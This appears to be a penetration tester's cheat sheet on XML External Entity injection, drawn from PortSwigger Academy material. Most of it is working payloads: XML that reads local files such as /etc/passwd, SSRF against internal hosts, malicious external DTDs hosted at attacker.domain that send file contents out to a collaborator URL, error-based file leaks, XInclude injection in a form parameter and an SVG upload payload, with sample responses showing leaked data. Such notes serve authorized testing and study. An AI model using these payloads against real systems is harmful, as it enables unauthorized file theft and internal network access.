icon:material/xml

# XML External Entity (XXE) Injection

## Retrieve Files

Add DOCTYPE line to XML and call entity via a value used in the app.

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xyz [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

## Invoke SSRF

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xyz [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
<foo>&xxe;</foo>
```

## Blind XXE

If response is not returned to client, we can use Burp collaborator for out-of-band testing ([read about OAST](https://portswigger.net/burp/application-security-testing/oast)).

#### Blind XEE using OAST

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xyz [ <!ENTITY xxe SYSTEM "http://SUBDOMAIN.burpcollaborator.net/"> ]>
<foo>&xxe;</foo>
```

#### Blind XXE using OAST via XML parameter entities

Add DOCTYPE line to XML with Burp collaborator URL and call XML parameter entity via a value used in the app (mind the ‘%’ in both lines).

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xyz [ <!ENTITY % xxe SYSTEM "http://SUBDOMAIN.burpcollaborator.net/"> %xxe; ]>
<foo>%xxe;</foo>
```

#### Blind XXE to exfiltrate data via OAST

In order to exfiltrate data using XEE via OAST, you need to host DTD. Note that files with newlines (e.g. ‘/etc/passwd’) cannot be exfiltrated this way.

First host malicious DTD (e.g. ‘http://attacker.domain/dtd’):

```bash
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://SUBDOMAIN.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate;
```

Then inject XXE in HTTP request:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xyz [<!ENTITY % xxe SYSTEM "http://attacker.domain/dtd"> %xxe;]>
```

#### Blind XXE to exfiltrate data via error messages

Works if the app returns the resulting error message within its response. It’s possible to exfiltrate files with newlines this way.

First host malicious DTD (e.g. ‘http://attacker.domain/dtd’):

```bash
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Then inject XXE in HTTP request:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xyz [<!ENTITY % xxe SYSTEM "http://malicious.domain/dtd"> %xxe;]>
```

Example HTTP response:

```bash
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 1339

"XML parser exited with non-zero code 1: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...]
```

#### Blind XXE by repurposing a local DTD

See [PortSwigger Academy](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-by-repurposing-a-local-dtd)

## Exploiting XInclude to Retrieve Files

Often you don’t see the XML from a client’s perspective. Instead, the app backend embeds user input into an XML document. Classic XXE will not work, but we can use XInclude for this.

```bash
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Example in HTTP request (injecting via ‘productId’ example parameter):

```bash
POST /product/stock HTTP/1.1
Host: example.net
Content-Type: application/x-www-form-urlencoded
Connection: close

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Example HTTP response:

```bash
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 1278

"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
[...]
```

## XXE via File Upload

Upload SVG file containing XXE code:

```bash
<?xml version="1.0" standalone="yes"?><!DOCTYPE xyz [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

## XXE via Modified Content Type

Some apps tolerant changing the content type to XML.

Normal HTTP request:

```bash
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Request content changed to XML, opening possible XXE attack surface:

```bash
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

## References

- [Portswigger.net Academy](https://portswigger.net/web-security/xxe)
